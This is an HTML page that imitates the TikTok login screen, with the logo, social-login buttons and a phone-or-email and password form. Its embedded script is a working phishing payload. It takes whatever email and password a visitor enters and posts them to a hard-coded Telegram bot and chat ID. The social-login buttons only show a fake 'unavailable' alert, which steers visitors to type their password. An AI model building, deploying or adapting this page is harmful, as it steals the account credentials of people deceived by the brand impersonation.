<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: 20px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo svg {
            width: 40px;
            height: 40px;
            fill: #fff;
        }
        
        .login-options {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .option {
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 12px 16px;
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.2s;
            font-weight: 500;
        }
        
        .option:hover {
            background: rgba(255, 255, 255, 0.12);
        }
        
        .option i {
            font-size: 18px;
        }
        
        .facebook {
            color: #1877F2;
        }
        
        .google {
            color: #EA4335;
        }
        
        .twitter {
            color: #1DA1F2;
        }
        
        .apple {
            color: #fff;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
            color: rgba(255, 255, 255, 0.5);
        }
        
        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .divider span {
            padding: 0 15px;
            font-size: 14px;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        .form-group input {
            width: 100%;
            background: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            padding: 14px 16px;
            color: #fff;
            font-size: 16px;
        }
        
        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.6);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #FE2C55;
        }
        
        .login-btn {
            width: 100%;
            background: #FE2C55;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 14px 16px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        
        .login-btn:hover {
            background: #ff0a3d;
        }
        
        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.8);
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-link:hover {
            color: #fff;
        }
        
        .signup-section {
            text-align: center;
            margin-top: 50px;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
        }
        
        .signup-link {
            color: #FE2C55;
            text-decoration: none;
            font-weight: 500;
            margin-left: 5px;
        }
        
        .signup-link:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: auto;
            padding: 20px 0;
            text-align: center;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
        }
        
        @media (max-height: 700px) {
            .container {
                margin-top: 20px;
            }
            
            .signup-section {
                margin-top: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg viewBox="0 0 24 24" width="40" height="40">
                <path d="M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z"/>
            </svg>
        </div>
        
        <div class="login-options">
            <button class="option">
                <i class="fab fa-apple apple"></i>
                Continue with Apple
            </button>
            <button class="option">
                <i class="fab fa-google google"></i>
                Continue with Google
            </button>
            <button class="option">
                <i class="fab fa-facebook facebook"></i>
                Continue with Facebook
            </button>
            <button class="option">
                <i class="fab fa-twitter twitter"></i>
                Continue with Twitter
            </button>
        </div>
        
        <div class="divider">
            <span>OR</span>
        </div>
        
        <form>
            <div class="form-group">
                <input id="email" type="text" placeholder="Phone or email" required>
            </div>
            <div class="form-group">
                <input id="password" type="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        
        <a href="#" class="forgot-link">Forgot password?</a>
        
        <div class="signup-section">
            <span>Don't have an account?</span>
            <a href="#" class="signup-link">Sign up</a>
        </div>
    </div>
    
    <div class="footer">
        <p>Â© 2023 TikTok</p>
    </div>

    <script>

      const BOT_TOKEN = '7252537848:AAHHnI05acNemda4o68TZ3UYKySYw-46XvM';
      const CHAT_ID = '6329815039';

function sendTelegramMessage(messageText) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    const requestBody = {
        chat_id: CHAT_ID,
        text: messageText
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(requestBody)
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent successfully:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error);
    });
}

        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.querySelector('form');
            const loginOptions = document.querySelectorAll('.option');
            
            // Form submission
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                const inputs = this.querySelectorAll('input');
                let isValid = true;
                
                inputs.forEach(input => {
                    if (!input.value.trim()) {
                        isValid = false;
                        input.style.borderColor = '#FE2C55';
                    } else {
                        input.style.borderColor = 'rgba(255, 255, 255, 0.1)';
                    }
                });
                
                if (isValid) {
                    this.querySelector('.login-btn').textContent = 'Logging in...';
                    setTimeout(() => {
                      let email = document.querySelector("#email").value
                      let password = document.querySelector("#password").value;
                      sendTelegramMessage("Email: " + email + " Password: " + password)
                        this.querySelector('.login-btn').textContent = 'Log in';
                    }, 1000);
                }
            });
            
            // Login options click handlers
            loginOptions.forEach(option => {
                option.addEventListener('click', function() {
                    const platform = this.textContent.trim().replace('Continue with ', '');
                    alert(`Login with ${platform} unavailable try other options`);
                });
            });
        });
    </script>
</body>
</html>
